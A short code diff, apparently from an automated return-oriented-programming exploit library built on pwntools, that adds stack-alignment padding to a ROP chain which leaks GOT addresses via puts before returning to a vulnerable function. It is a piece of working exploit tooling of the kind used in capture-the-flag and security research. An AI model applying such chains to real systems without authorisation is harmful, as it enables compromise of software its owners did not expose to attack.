@@ -1,5 +1,5 @@
 from autorop import PwnState, arutil, constants
-from pwn import ROP, log
+from pwn import context, ROP, log, align
 
 
 def puts(state: PwnState) -> PwnState:
@@ -12,6 +12,13 @@ def puts(state: PwnState) -> PwnState:
     rop = ROP(state.elf)
     for func in LEAK_FUNCS:
         rop.puts(state.elf.got[func])
+
+    # ensure that call to vuln_function is stack-aligned
+    # by aligning it minus one word
+    arutil.align_rop(
+        rop,
+        align(constants.STACK_ALIGNMENT, len(rop.chain())) // context.bytes - 1,
+    )
     rop.call(state.vuln_function)  # return back so we can execute more chains later
     log.info(rop.dump())
 
